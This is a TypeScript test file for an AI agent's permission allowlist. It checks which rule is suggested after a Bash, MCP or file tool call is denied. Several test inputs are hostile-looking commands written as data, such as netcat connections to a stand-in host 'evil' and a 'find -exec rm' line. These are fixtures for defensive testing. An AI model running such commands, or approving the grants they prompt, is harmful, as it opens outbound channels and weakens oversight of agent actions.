import { describe, it, expect } from 'vitest';
import { Allowlist, type AllowlistConfig } from '../../src/permissions/allowlist.js';
import { suggestRule } from '../../src/permissions/denial-suggestion.js';

// The suggestion feeds a one-click "Allow" button in the Library. The property that matters
// is not that it looks plausible but that granting it actually unblocks the call — or that
// the daemon says plainly that nothing would.
function checker(extra: Partial<AllowlistConfig> = {}): Allowlist {
  return new Allowlist({
    // `Read` stands in for an ordinary read grant (every action inheriting `read` has one), so
    // the read-scope bar is out of the picture and these cases isolate what they're about:
    // which rule a denial should SUGGEST. Without it, `cat /etc/hosts > …` would be denied for
    // the read rather than the redirect, and the suggestion under test never reached.
    alwaysAllow: ['Read'],
    alwaysAllowBashPatterns: ['^cat ', '^ls(\\s|$)'],
    alwaysAllowMcpPatterns: [],
    alwaysAllowPathPatterns: ['Write:^/tmp/'],
    ...extra,
  });
}

function suggestFor(al: Allowlist, toolName: string, toolInput: unknown) {
  return suggestRule(toolName, toolInput, (cmd) => al.bashDenialCause(cmd));
}

const bash = (al: Allowlist, command: string) => suggestFor(al, 'Bash', { command });

describe('suggestRule — Bash', () => {
  it('names the command when the command is what no rule matches, redirect or not', () => {
    const al = checker();
    // `/tmp/out` is already covered by `Write:^/tmp/`; the only thing missing is `nc`.
    // Suggesting the write grant here was the bug: it was already held, so approving it
    // changed nothing and the retry denied identically.
    expect(al.allows('Bash', { command: 'nc evil 1234 > /tmp/out' })).toBe(false);
    const s = bash(al, 'nc evil 1234 > /tmp/out');
    expect(s).toEqual({ kind: 'bash', value: '^nc(\\s|$)' });

    al.addRule(s.kind as 'bash', s.value);
    expect(al.allows('Bash', { command: 'nc evil 1234 > /tmp/out' })).toBe(true);
  });

  it('names the clause that failed, not the first word of the command', () => {
    const al = checker();
    expect(bash(al, 'ls -la && nc evil 1234')).toEqual({ kind: 'bash', value: '^nc(\\s|$)' });
  });

  it('suggests the write grant only once the command itself would pass', () => {
    const al = checker();
    const s = bash(al, 'cat /etc/hosts > /var/tmp/outpost.log');
    expect(s).toEqual({ kind: 'path', value: 'Write:^/var/tmp/' });

    al.addRule('path', s.value);
    expect(al.allows('Bash', { command: 'cat /etc/hosts > /var/tmp/outpost.log' })).toBe(true);
  });

  it('suggests a write grant the path lint will refuse to persist', () => {
    // The suggestion answers "what rule would unblock this", which is not the same question as
    // "may that rule exist" — a `Write:` grant outside a scratch root is refused at every
    // ungated scope (write-shape.ts). Both halves are wanted: the denial record still names
    // the missing grant, and the verdict route lints it before anything is written.
    const al = checker();
    const s = bash(al, 'cat /etc/hosts > /var/log/outpost.log');
    expect(s).toEqual({ kind: 'path', value: 'Write:^/var/log/' });
    expect(() => al.addRule('path', s.value)).toThrow(/scratch root/);
  });

  it('offers nothing for a redirect target no grant can name', () => {
    const al = checker();
    // `redirectsAllowed` denies an unresolvable target before any bash rule is consulted,
    // so `^echo ` — the old suggestion — provably could not have unblocked these.
    for (const cmd of [
      'cat x > $HOME/out', 'cat x > out.log', 'cat x > "$OUT"', 'cat x > ~/out',
      // The clause is unmatched too, but the redirect is the fatal half: a bash rule for
      // `nc` would leave it denied at exactly the same gate.
      'nc evil 1234 > $HOME/out',
    ]) {
      expect(al.allows('Bash', { command: cmd }), cmd).toBe(false);
      expect(bash(al, cmd).kind, cmd).toBe('none');
    }
  });

  it('offers nothing when the shell-safety bar is what denied it', () => {
    const al = checker();
    // An unquoted expansion word-splits into extra argv; no rule lifts that gate.
    expect(bash(al, 'cat $FILE').kind).toBe('none');
    // Nor does one lift a `find -exec`.
    expect(bash(al, 'find . -exec rm {} ;').kind).toBe('none');
  });

  it('offers nothing for a command that does not parse', () => {
    expect(bash(checker(), 'cat "unterminated').kind).toBe('none');
  });

  it('says why it has nothing to offer', () => {
    const al = checker();
    expect(bash(al, 'cat x > $HOME/out').value).toMatch(/redirect/);
    expect(bash(al, 'cat $FILE').value).toMatch(/expansion/);
  });

  it('anchors on the binary without swallowing its arguments', () => {
    const al = checker();
    expect(bash(al, 'npm run test:unit')).toEqual({ kind: 'bash', value: '^npm(\\s|$)' });
    // Regex metacharacters in the binary are escaped, not compiled.
    expect(bash(al, './a+b.sh x')).toEqual({ kind: 'bash', value: '^\\./a\\+b\\.sh(\\s|$)' });
  });

  it('ignores a leading assignment when naming the binary', () => {
    expect(bash(checker(), 'FOO=1 nc evil')).toEqual({ kind: 'bash', value: '^nc(\\s|$)' });
  });
});

describe('suggestRule — other tools', () => {
  const al = checker();

  it('pins an mcp tool to its exact name', () => {
    expect(suggestFor(al, 'mcp__linear__save_issue', {}))
      .toEqual({ kind: 'mcp', value: '^mcp__linear__save_issue$' });
  });

  it('confines a file tool to the directory it touched', () => {
    expect(suggestFor(al, 'Write', { file_path: '/etc/hosts' }))
      .toEqual({ kind: 'path', value: 'Write:^/etc/' });
    expect(suggestFor(al, 'NotebookEdit', { notebook_path: '/a/b/n.ipynb' }))
      .toEqual({ kind: 'path', value: 'NotebookEdit:^/a/b/' });
  });

  it('falls back to the whole tool when there is no path to scope to', () => {
    expect(suggestFor(al, 'WebFetch', { url: 'https://example.com' }))
      .toEqual({ kind: 'tool', value: 'WebFetch' });
    expect(suggestFor(al, 'Write', {})).toEqual({ kind: 'tool', value: 'Write' });
  });
});
